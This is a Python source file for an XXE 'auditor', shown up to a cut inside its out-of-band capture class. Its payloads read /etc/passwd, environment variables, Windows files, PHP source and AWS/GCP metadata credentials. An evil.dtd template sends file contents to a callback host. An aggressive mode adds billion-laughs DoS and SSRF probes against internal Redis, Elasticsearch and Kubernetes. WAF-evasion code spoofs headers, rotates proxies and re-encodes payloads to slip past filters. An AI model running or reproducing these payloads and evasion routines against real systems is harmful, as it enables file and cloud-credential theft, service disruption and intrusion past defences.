#!/usr/bin/env python3
"""
auditing_tools/xxe_finder.py — XML External Entity Auditor (v5.0)
═══════════════════════════════════════════════════════════════════════════════

Military-grade XXE detection with WAF evasion, SSRF chaining, and
confirmed-only output.

SAFETY MODEL
────────────
Every target request flows through `EvasionSession`:
  • Jittered pacing
  • User-Agent + X-Forwarded-For rotation
  • Optional proxy rotation
  • Exponential back-off on 403/406/429/503
  • 60-second cool-down after a WAF block page

Aggressive mode (--aggressive) enables billion-laughs DoS and
SSRF-to-internal-service payloads. Off by default.

CONFIRMATION MODEL
──────────────────
  IN-BAND    — File markers appear in response (e.g. "root:x:0:0").
               Metadata markers escalate to cloud-credential chain.

  ERROR      — File content appears inside a parser error message.
               Requires parser signature difference vs control.

  BYPASS     — File markers appear via encoding variant (UTF-16LE/BE,
               UTF-8 BOM, DOCTYPE split, case-mix).

  OOB        — External DTD callback received (interactsh mode → confirmed;
               manual mode → HIGH pending).

SEVERITY (impact-driven)
────────────────────────
  CRITICAL   In-band or bypass with cloud metadata markers
             (AccessKeyId / SecretAccessKey / ami-id).
  HIGH       In-band file read (/etc/passwd, win.ini, PHP source),
             error-based with parser signature, OOB confirmed.
  MEDIUM     Error-based without signature match, OOB pending (manual mode),
             capability-only findings.
  LOW        Surface candidate only.
  INFO       Denial / param ignored.

CHAINS
──────
  xxe-file-read          arbitrary file read confirmed
  xxe-cloud-credentials  AWS/GCP/Azure metadata exposure
  xxe-oob-blind          blind XXE via OOB callback
  xxe-ssrf               internal service reachable (aggressive)
  xxe-waf-bypass         WAF bypassed with encoding variant
  xxe-dos                billion laughs / entity expansion (aggressive)

OUTPUTS
───────
  xxe_findings.json       every finding
  xxe_confirmed.json      HIGH / CRITICAL only
  xxe_chains.json         structured chain records
  xxe_evidence/           per-finding payload + response snippet
  xxe_candidates.txt      flat triage
  xxe_confirmed.txt       confirmed flat triage
  xxe_oob.txt             blind payloads + evil.dtd templates
  xxe_surface.txt         all XML-accepting endpoints
  xxe_fingerprints.txt    parser family + capabilities
"""

from __future__ import annotations

import hashlib
import json
import logging
import random
import re
import shutil
import statistics
import string
import subprocess
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.xxe_finder")


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    return getattr(CFG, key, default) if CFG_LOADED else default


def _xxe_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("xxe", {}) or {}
    return {
        "rate_limit":   entry.get("rate_limit", 3),
        "concurrency":  entry.get("concurrency", 3),
        "timeout":      entry.get("timeout", 12),
        "max_surfaces": entry.get("max_surfaces", 200),
        "test_error":   entry.get("error_based", True),
        "test_oob":     entry.get("oob", True),
        "test_bypass":  entry.get("bypass", True),
        "verify_tls":   entry.get("verify_tls", _cfg("VERIFY_TLS", False)),
        "jitter":       entry.get("jitter", 0.4),
        "proxies":      entry.get("proxies", []),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        h.update(getattr(CFG, "AUTH_HEADERS", {}) or {})
    return h


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  SEVERITY
# ═════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    INFO     = "INFO"
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

    @property
    def rank(self) -> int:
        return {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[self.value]


# ═════════════════════════════════════════════════════════════════════════════
#  WAF DETECTION + EVASION
# ═════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES: dict[str, dict] = {
    "Cloudflare":  {"headers": ["cf-ray", "__cf_bm"], "body": ["Attention Required! | Cloudflare"]},
    "Akamai":      {"headers": ["akamai-grn", "x-akamai-transformed"], "body": ["Access Denied"]},
    "Imperva":     {"headers": ["x-iinfo", "incap_ses"], "body": ["Pardon Our Interruption"]},
    "AWS WAF":     {"headers": ["x-amzn-requestid"], "body": ["Request blocked"]},
    "F5 BIG-IP":   {"headers": ["x-wa-info", "bigipserver"], "body": ["The requested URL was rejected"]},
    "Sucuri":      {"headers": ["x-sucuri-id"], "body": ["Sucuri WebSite Firewall"]},
    "DataDome":    {"headers": ["x-datadome"], "body": ["captcha-delivery"]},
    "ModSecurity": {"headers": ["x-mod-security"], "body": ["ModSecurity"]},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
]


@dataclass
class WAFReport:
    vendor: str = "unknown"
    confidence: int = 0
    signals: list[str] = field(default_factory=list)
    blocked: bool = False


@dataclass
class EvasionProfile:
    rate_limit: float = 3.0
    jitter: float = 0.4
    rotate_ua: bool = True
    rotate_xff: bool = True
    proxies: list[str] = field(default_factory=list)
    backoff_codes: tuple[int, ...] = (403, 406, 429, 503)
    max_backoff: float = 30.0
    cooldown_after_block: float = 60.0


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

FINDING_SCHEMA_VERSION = 2

DEFAULT_TIMEOUT         = 12
BASELINE_SAMPLES        = 2
REQUEST_SLEEP           = 0.08
MAX_RESPONSE_BYTES      = 2_000_000

OOB_CORRELATION_WAIT    = 10.0
INTERACTSH_STARTUP_WAIT = 3.0

MAX_SURFACES             = 200
MAX_PAYLOADS_PER_SURFACE = 14

LINUX_FILE_MARKERS = [
    "root:x:0:0", "root:*:0:0", "daemon:", "bin:x:", "/bin/bash",
    "uid=0(root)", "hostname", "PATH=",
]
WINDOWS_FILE_MARKERS = [
    "[extensions]", "[fonts]", "[boot loader]",
    "for 16-bit app support", "[mci extensions]",
    "127.0.0.1       localhost",
]
PHP_SOURCE_MARKERS = ["PD9waHA", "PGh0bWw+", "PCFET0NUWVBFIGh0bWw+"]
METADATA_MARKERS = [
    "AccessKeyId", "SecretAccessKey", "ami-id", "instance-id",
    "computeMetadata", "service-accounts", "token_type",
    "subscriptionId", "vmId", "resourceGroupName",
]
CLOUD_CREDENTIAL_MARKERS = [
    "AccessKeyId", "SecretAccessKey", "SessionToken",
    "service-accounts", "client_secret",
]
FILE_MARKERS = (LINUX_FILE_MARKERS + WINDOWS_FILE_MARKERS + METADATA_MARKERS)

PARSER_SIGNATURES = {
    "libxml2": [
        r"lxml\.etree\.XMLSyntaxError", r"xmlParseEntityRef",
        r"Failed to load external entity", r"Premature end of data in tag",
        r"DOMDocument::loadXML",
    ],
    "xerces": [
        r"org\.apache\.xerces", r"com\.sun\.org\.apache\.xerces",
        r"SAXParseException", r"was referenced, but not declared",
        r"cvc-elt\.",
    ],
    "dotnet": [
        r"System\.Xml\.XmlException", r"System\.Xml\.XmlReader",
        r"An error occurred while parsing EntityName",
        r"DTD is prohibited", r"XslCompiledTransform",
    ],
    "java_sax": [
        r"org\.xml\.sax\.SAXParseException", r"DocumentBuilder",
        r"JAXP00010001", r"AccessExternalDTD", r"disallow-doctype-decl",
    ],
    "java_stax": [
        r"javax\.xml\.stream\.XMLStreamException",
        r"IS_SUPPORTING_EXTERNAL_ENTITIES", r"woodstox", r"com\.ctc\.wstx",
    ],
    "python_etree": [r"xml\.etree\.ElementTree\.ParseError"],
    "nokogiri":     [r"Nokogiri::XML::SyntaxError"],
    "ruby_rexml":   [r"REXML::ParseException"],
    "node_libxml":  [r"libxmljs\.parseXml"],
    "go_xml":       [r"xml: syntax error", r"XML syntax error"],
    "php_libxml":   [r"libxml_get_errors", r"simplexml_load_string"],
}

SOAP_PATH_HINTS   = ("/soap", "/ws", "/services", "/xmlrpc",
                     ".asmx", ".svc", "/wsdl")
SAML_PATH_HINTS   = ("/saml", "/acs", "/sso", "/sso/saml", "/auth/saml")
IMPORT_PATH_HINTS = ("/import", "/feed", "/rss", "/atom", "/upload",
                     "/avatar", "/attachment", "/xml")
XML_PARAM_NAMES = {
    "xml", "data", "soap", "saml", "body", "payload", "content",
    "xmldata", "xml_data", "document", "feed", "rss", "svg",
}

CAPABILITY_PROBES = [
    ("dtd_allowed",
     '<?xml version="1.0"?><!DOCTYPE r [<!ELEMENT r ANY>]><r>ARGUS_MARKER</r>',
     '<?xml version="1.0"?><r>ARGUS_MARKER</r>',
     "marker_present"),
    ("internal_entity",
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "ARGUS_ENTITY_MARKER">]><r>&x;</r>',
     '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
     "entity_expanded"),
    ("external_file",
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>',
     '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
     "file_read"),
    ("parameter_entity",
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p "ARGUS_PE_MARKER"> %p;]><r>ARGUS_AFTER_PE</r>',
     '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
     "pe_marker"),
    ("external_dtd",
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://127.0.0.1:1/argus.dtd"> %d;]><r>x</r>',
     '<?xml version="1.0"?><r>x</r>',
     "dtd_error"),
    ("xinclude",
     '<r xmlns:xi="http://www.w3.org/2001/XInclude">'
     '<xi:include href="file:///etc/hostname" parse="text"/></r>',
     '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
     "file_read"),
]

INBAND_PAYLOADS = [
    {"label": "linux_passwd", "requires": "external_file",
     "markers": LINUX_FILE_MARKERS,
     "body": ('<?xml version="1.0" encoding="UTF-8"?>'
              '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
              '<data>&xxe;</data>')},
    {"label": "linux_proc_environ", "requires": "external_file",
     "markers": LINUX_FILE_MARKERS,
     "body": ('<?xml version="1.0" encoding="UTF-8"?>'
              '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>'
              '<data>&xxe;</data>')},
    {"label": "linux_hosts", "requires": "external_file",
     "markers": LINUX_FILE_MARKERS,
     "body": ('<?xml version="1.0" encoding="UTF-8"?>'
              '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>'
              '<data>&xxe;</data>')},
    {"label": "windows_winini", "requires": "external_file",
     "markers": WINDOWS_FILE_MARKERS,
     "body": ('<?xml version="1.0" encoding="UTF-8"?>'
              '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
              '<data>&xxe;</data>')},
    {"label": "windows_hosts", "requires": "external_file",
     "markers": WINDOWS_FILE_MARKERS,
     "body": ('<?xml version="1.0" encoding="UTF-8"?>'
              '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
              '"file:///c:/windows/system32/drivers/etc/hosts">]>'
              '<data>&xxe;</data>')},
    {"label": "php_filter_source", "requires": "external_file",
     "markers": PHP_SOURCE_MARKERS,
     "body": ('<?xml version="1.0" encoding="UTF-8"?>'
              '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
              '"php://filter/convert.base64-encode/resource=index.php">]>'
              '<data>&xxe;</data>')},
    {"label": "aws_metadata", "requires": "external_file",
     "markers": METADATA_MARKERS,
     "body": ('<?xml version="1.0" encoding="UTF-8"?>'
              '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
              '"http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>'
              '<data>&xxe;</data>')},
    {"label": "gcp_metadata", "requires": "external_file",
     "markers": METADATA_MARKERS,
     "body": ('<?xml version="1.0" encoding="UTF-8"?>'
              '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
              '"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>'
              '<data>&xxe;</data>')},
]

AGGRESSIVE_INBAND_PAYLOADS = [
    {"label": "ssrf_redis", "requires": "external_file",
     "markers": ["redis_version", "-NOAUTH", "+PONG"],
     "body": ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
              '"http://127.0.0.1:6379/">]><data>&xxe;</data>')},
    {"label": "ssrf_elasticsearch", "requires": "external_file",
     "markers": ["You Know, for Search", "cluster_name"],
     "body": ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
              '"http://127.0.0.1:9200/">]><data>&xxe;</data>')},
    {"label": "ssrf_kubernetes", "requires": "external_file",
     "markers": ["kube-system", '"kind": "Status"'],
     "body": ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
              '"http://127.0.0.1:10255/pods">]><data>&xxe;</data>')},
]

AGGRESSIVE_DOS_PAYLOADS = [
    {"label": "billion_laughs", "requires": "internal_entity",
     "body": ('<?xml version="1.0"?>'
              '<!DOCTYPE lolz ['
              '<!ENTITY lol "lol">'
              '<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
              '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">'
              '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
              '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
              '<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">'
              ']><lolz>&lol5;</lolz>')},
]

ERROR_PAYLOADS = [
    {"label": "local_dtd_default", "requires": "external_file",
     "markers": LINUX_FILE_MARKERS,
     "body": ('<?xml version="1.0"?>'
              '<!DOCTYPE foo ['
              '<!ENTITY % file SYSTEM "file:///etc/passwd">'
              '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
              "'file:///nonexistent/%file;'>\">"
              '%eval;%error;]>')},
    {"label": "local_dtd_xml_share", "requires": "external_file",
     "markers": LINUX_FILE_MARKERS,
     "body": ('<?xml version="1.0"?>'
              '<!DOCTYPE foo ['
              '<!ENTITY % file SYSTEM "file:///etc/passwd">'
              '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
              "'file:///usr/share/xml/%file;'>\">"
              '%eval;%error;]>')},
    {"label": "external_pe_error", "requires": "parameter_entity",
     "markers": LINUX_FILE_MARKERS,
     "body": ('<?xml version="1.0"?>'
              '<!DOCTYPE foo ['
              '<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
              '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
              "'file:///nonexistent/%xxe;'>\">"
              '%eval;%error;]>')},
]

OOB_EVIL_DTD = (
    '<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
    '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{oob}/?d=%file;\'>">\n'
    '%eval;\n'
    '%exfil;\n'
)

OOB_PAYLOAD_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob}/evil.dtd"> %xxe;]>'
    '<data>ARGUS_OOB_PROBE</data>'
)

OOB_PING_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob}/"> %xxe;]>'
    '<data>ARGUS_OOB_PING</data>'
)

DENIAL_MARKERS = (
    "blocked", "forbidden", "not allowed", "invalid request",
    "not permitted", "request denied",
)


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class XMLSurface:
    url: str
    method: str = "POST"
    param: str = "(body)"
    location: str = "body"
    hint: str = ""
    accepts_xml: bool = False
    content_type: str = ""

    def to_dict(self) -> dict:
        return {"url": self.url, "method": self.method, "param": self.param,
                "location": self.location, "hint": self.hint,
                "accepts_xml": self.accepts_xml, "content_type": self.content_type}


@dataclass
class ParserProfile:
    url: str
    family: str = "unknown"
    capabilities: dict[str, bool] = field(default_factory=dict)
    baseline_status: int = 0
    baseline_length: int = 0

    def to_dict(self) -> dict:
        return {"url": self.url, "family": self.family,
                "capabilities": self.capabilities,
                "baseline_status": self.baseline_status,
                "baseline_length": self.baseline_length}


@dataclass
class XXEFinding:
    target: str
    param: str
    technique: str
    context: str = ""
    severity: Severity = Severity.MEDIUM
    confidence: int = 50
    confirmed: bool = False
    payload: str = ""
    evidence: str = ""
    file_read: str = ""
    parser_family: str = ""
    oob_token: str = ""
    oob_confirmed: bool = False
    bypass_used: str = ""
    param_location: str = "body"
    http_status: int = 0
    chain_ids: list[str] = field(default_factory=list)
    waf_vendor: str = ""
    auth_enabled: bool = False
    first_seen: str = ""
    details: dict = field(default_factory=dict)

    @property
    def finding_hash(self) -> str:
        raw = f"{self.target}|{self.param}|{self.param_location}|{self.technique}"
        return hashlib.sha256(raw.encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "schema_version": FINDING_SCHEMA_VERSION,
            "target":         self.target,
            "target_host":    self.target_host,
            "param_name":     self.param,
            "param_location": self.param_location,
            "technique":      self.technique,
            "context":        self.context,
            "severity":       self.severity.value,
            "confidence":     self.confidence,
            "confirmed":      self.confirmed,
            "payload":        (self.payload or "")[:2048],
            "evidence":       (self.evidence or "")[:1024],
            "file_read":      (self.file_read or "")[:512],
            "parser_family":  self.parser_family,
            "oob_token":      self.oob_token,
            "oob_confirmed":  self.oob_confirmed,
            "bypass_used":    self.bypass_used,
            "http_status":    self.http_status,
            "chain_ids":      self.chain_ids,
            "waf_vendor":     self.waf_vendor,
            "details":        self.details,
            "auth_enabled":   self.auth_enabled,
            "finding_hash":   self.finding_hash,
            "first_seen":     self.first_seen or _db_now(),
        }


@dataclass
class XXEChain:
    chain_id: str
    name: str
    severity: Severity
    steps: list[str]
    finding_hashes: list[str] = field(default_factory=list)
    evidence: str = ""

    def to_dict(self) -> dict:
        return {"chain_id": self.chain_id, "name": self.name,
                "severity": self.severity.value, "steps": self.steps,
                "finding_hashes": self.finding_hashes,
                "evidence": self.evidence[:600]}


# ═════════════════════════════════════════════════════════════════════════════
#  EVASION SESSION
# ═════════════════════════════════════════════════════════════════════════════

class EvasionSession:
    def __init__(self, profile: EvasionProfile, headers: dict,
                 timeout: int, *, verify_tls: bool = False,
                 max_bytes: int = MAX_RESPONSE_BYTES):
        self.profile = profile
        self.timeout = timeout
        self.max_bytes = max_bytes
        self.session = requests.Session()
        self.session.verify = verify_tls
        if headers:
            self.session.headers.update(headers)
        self.session.headers.setdefault("User-Agent", "Argus-XXE-Auditor/5.0")
        self.session.headers.setdefault(
            "Accept", "application/xml, text/xml, application/xhtml+xml, */*",
        )
        if not verify_tls:
            log.warning("TLS verification disabled (verify_tls=False) — engagement-only")

        self._min_interval = 1.0 / profile.rate_limit if profile.rate_limit > 0 else 0.0
        self._last = 0.0
        self._backoff = 0.0
        self._cooldown_until = 0.0
        self._proxy_idx = 0
        self._ua_idx = 0
        self._xff_counter = 0
        self._lock = threading.Lock()

    def __enter__(self): return self
    def __exit__(self, *exc):
        try: self.session.close()
        except Exception: pass

    def _pace(self):
        now = time.monotonic()
        if now < self._cooldown_until:
            time.sleep(self._cooldown_until - now)
        interval = self._min_interval + random.uniform(0, self.profile.jitter)
        elapsed = time.monotonic() - self._last
        if elapsed < interval:
            time.sleep(interval - elapsed)
        if self._backoff > 0:
            time.sleep(self._backoff)
        self._last = time.monotonic()

    def _rotate(self):
        with self._lock:
            if self.profile.rotate_ua:
                self.session.headers["User-Agent"] = USER_AGENTS[
                    self._ua_idx % len(USER_AGENTS)]
                self._ua_idx += 1
            if self.profile.rotate_xff:
                self._xff_counter += 1
                o = self._xff_counter % 254 + 1
                self.session.headers["X-Forwarded-For"] = f"10.0.{o}.{o}"
                self.session.headers["X-Real-IP"] = f"10.0.{o}.{o}"

    def _proxy(self) -> Optional[dict]:
        if not self.profile.proxies:
            return None
        with self._lock:
            p = self.profile.proxies[self._proxy_idx % len(self.profile.proxies)]
            self._proxy_idx += 1
        return {"http": p, "https": p}

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._pace()
        self._rotate()
        proxy = self._proxy()
        try:
            resp = self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                stream=True, proxies=proxy, **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {_redact_url(url)}: {e}")
            return None

        try:
            resp._content = resp.raw.read(self.max_bytes, decode_content=True)
        except Exception:
            resp._content = b""

        if resp.status_code in self.profile.backoff_codes:
            self._backoff = min(self.profile.max_backoff,
                                max(1.0, self._backoff * 2 or 1.0))
            low = (resp.text or "")[:2000].lower()
            if any(w in low for w in ("blocked", "firewall", "captcha", "denied")):
                self._cooldown_until = time.monotonic() + self.profile.cooldown_after_block
                log.warning("  WAF block — cooling down %.0fs",
                            self.profile.cooldown_after_block)
        elif resp.status_code < 400:
            self._backoff = 0.0
        return resp

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)

    def post(self, url: str, **kwargs):
        return self.request("POST", url, **kwargs)

    def benign_get(self, url: str) -> Optional[requests.Response]:
        try:
            return self.session.get(url, timeout=self.timeout, verify=False)
        except requests.RequestException:
            return None


def detect_waf(session: EvasionSession, url: str) -> WAFReport:
    report = WAFReport()
    try:
        resp = session.benign_get(url)
    except Exception:
        return report
    if resp is None:
        return report
    header_blob = " ".join(f"{k.lower()}:{v}" for k, v in resp.headers.items()).lower()
    body_blob = _body(resp)[:4000].lower()
    for vendor, sig in WAF_SIGNATURES.items():
        hits = [f"header:{h}" for h in sig["headers"] if h.lower() in header_blob]
        hits += [f"body:{b[:40]}" for b in sig["body"] if b.lower() in body_blob]
        if hits:
            report.vendor = vendor
            report.signals = hits
            report.confidence = min(100, 50 + 15 * len(hits))
            break
    if resp.status_code in (403, 406, 429, 503):
        low = (resp.text or "")[:2000].lower()
        if any(w in low for w in ("blocked", "denied", "firewall", "captcha")):
            report.blocked = True
            if report.vendor == "unknown":
                report.vendor = "generic-waf"
                report.confidence = 40
    return report


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

_SECRET_PARAM_RE = re.compile(
    r"(?i)(cookie|authorization|token|api[_-]?key|secret|password|session|bearer)"
)


def _redact_url(url: str, max_len: int = 240) -> str:
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return url[:max_len]
        pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        redacted = [(k, "***" if _SECRET_PARAM_RE.search(k) else v) for k, v in pairs]
        clean = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(redacted, safe="")))
        return clean[:max_len]
    except Exception:
        return url[:max_len]


def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls, seen = [], set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        tok = line.split()[0]
        if not tok.startswith(("http://", "https://")):
            tok = "https://" + tok
        if tok not in seen:
            seen.add(tok)
            urls.append(tok)
    return urls


def _body(resp: Optional[requests.Response], limit: int = MAX_RESPONSE_BYTES) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _match_markers(body: str, markers: list[str]) -> list[str]:
    return [m for m in markers if m in body]


def _fingerprint_parser(body: str) -> str:
    for family, sigs in PARSER_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, body, re.I):
                return family
    return ""


def _looks_denied(resp: Optional[requests.Response]) -> bool:
    # v5 fix: network error is NOT a denial
    if resp is None:
        return False
    body_low = (resp.text or "")[:2000].lower()
    return any(m in body_low for m in DENIAL_MARKERS)


def _utf16be(payload: str) -> bytes:
    adjusted = re.sub(r'encoding\s*=\s*["\']UTF-8["\']', 'encoding="UTF-16"',
                      payload, flags=re.I)
    if 'encoding="UTF-16"' not in adjusted:
        adjusted = '<?xml version="1.0" encoding="UTF-16"?>' + re.sub(
            r"^<\?xml[^>]*\?>", "", adjusted)
    return adjusted.encode("utf-16-be")


def _utf16le(payload: str) -> bytes:
    adjusted = re.sub(r'encoding\s*=\s*["\']UTF-8["\']', 'encoding="UTF-16"',
                      payload, flags=re.I)
    if 'encoding="UTF-16"' not in adjusted:
        adjusted = '<?xml version="1.0" encoding="UTF-16"?>' + re.sub(
            r"^<\?xml[^>]*\?>", "", adjusted)
    return adjusted.encode("utf-16-le")


def _waf_variants_xml(payload: str) -> list[tuple[bytes, str]]:
    variants: list[tuple[bytes, str]] = []
    variants.append((_utf16be(payload), "utf16be"))
    variants.append((_utf16le(payload), "utf16le"))
    mixed = re.sub(r"<!DOCTYPE", "<!doctype", payload, flags=re.I)
    mixed = re.sub(r"<!ENTITY", "<!entity", mixed, flags=re.I)
    mixed = re.sub(r"\bSYSTEM\b", "system", mixed)
    if mixed != payload:
        variants.append((mixed.encode("utf-8"), "case_mix"))
    variants.append((b"\xef\xbb\xbf" + payload.encode("utf-8"), "utf8_bom"))
    split = re.sub(r"<!DOCTYPE", "<!D\nOCTYPE", payload, flags=re.I)
    if split != payload:
        variants.append((split.encode("utf-8"), "doctype_split"))
    return variants


# ═════════════════════════════════════════════════════════════════════════════
#  CHAINS
# ═════════════════════════════════════════════════════════════════════════════

def _chain_ids_for(f: XXEFinding) -> list[str]:
    ids: list[str] = []
    if not f.confirmed and f.severity.rank < Severity.HIGH.rank:
        return ids
    evidence_l = (f.evidence or "").lower()
    file_l = (f.file_read or "").lower()
    if any(m.lower() in evidence_l or m.lower() in file_l
           for m in CLOUD_CREDENTIAL_MARKERS):
        ids.append("xxe-cloud-credentials")
    if f.technique in ("inband", "error", "bypass") and f.file_read:
        if "xxe-cloud-credentials" not in ids:
            ids.append("xxe-file-read")
    if f.technique == "oob" and f.oob_confirmed:
        ids.append("xxe-oob-blind")
    if "ssrf_" in (f.details.get("label", "") or ""):
        ids.append("xxe-ssrf")
    if f.bypass_used:
        ids.append("xxe-waf-bypass")
    if "billion" in (f.details.get("label", "") or "").lower():
        ids.append("xxe-dos")
    return list(dict.fromkeys(ids))


def build_chains(findings: list[XXEFinding]) -> list[XXEChain]:
    chains: dict[str, list[XXEFinding]] = {}
    NAMES = {
        "xxe-file-read":         "XXE → arbitrary file read",
        "xxe-cloud-credentials": "XXE → cloud metadata / credential exposure",
        "xxe-oob-blind":         "XXE → blind confirmed via OOB callback",
        "xxe-ssrf":              "XXE → internal service reach (SSRF chain)",
        "xxe-waf-bypass":        "XXE → WAF bypass with encoding variant",
        "xxe-dos":               "XXE → billion laughs / entity expansion",
    }
    for f in findings:
        for cid in (_chain_ids_for(f) or f.chain_ids):
            chains.setdefault(cid, []).append(f)
            if cid not in f.chain_ids:
                f.chain_ids.append(cid)
    out: list[XXEChain] = []
    for cid, fs in chains.items():
        max_sev = max(fs, key=lambda x: x.severity.rank).severity
        out.append(XXEChain(
            chain_id=cid, name=NAMES.get(cid, cid), severity=max_sev,
            steps=[x.evidence for x in fs],
            finding_hashes=[x.finding_hash for x in fs],
            evidence=fs[0].evidence if fs else "",
        ))
    return out


# ═════════════════════════════════════════════════════════════════════════════
#  OOB CAPTURE
# ═════════════════════════════════════════════════════════════════════════════

class OOBCapture:
    def __init__(self, domain: Optional[str] = None, use_interactsh: bool = False):
        self.user_domain = domain
        self.use_interactsh = use_interactsh
        self.domain: Optional[str] = domain
        self.proc: Optional[subprocess.Popen] = None
        self.reader_thread: Optional[threading.Thread] = None
        self.interactions: list[dict] = []
        self.interaction_ids: set[str] = set()
        self.lock = threading.Lock()

    def start(self) -> bool:
        if self.user_domain:
            self.domain = self.user_domain
            log.info(f"    OOB domain : {self.domain} (manual verification)")
            return True
        if not self.use_interactsh:
            log.info("    OOB        : disabled")
            return False
        if not shutil.which("interactsh-client"):
            log.warning("    OOB        : interactsh-client not installed")
            return False
        try:
            self.proc = subprocess.Popen(
                ["interactsh-client", "-json"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, bufsize=1)
        except Exception as e:
            log.warning(f"    OOB        : spawn failed: {e}")
            return False
        domain = self._read_banner()
        if not domain:
            self.stop()
            return False
        self.domain = domain
        log.info(f"    OOB domain : {domain}")
        self.reader_thread = threading.Thread(
            target=self._read_interactions, daemon=True)
        self.reader_thread.start()
        return True

    def _read_banner(self) -> Optional[str]:
        import select
        deadline = time.monotonic() + INTERACTSH_STARTUP_WAIT
        if not self.proc or not self.proc.stderr:
            return None
        pattern = re.compile(
            r"([a-z0-9]{20,}\.(?:oast\.(?:fun|site|pro|online|live|me)|interact\.sh))",
            re.I)
        collected = ""
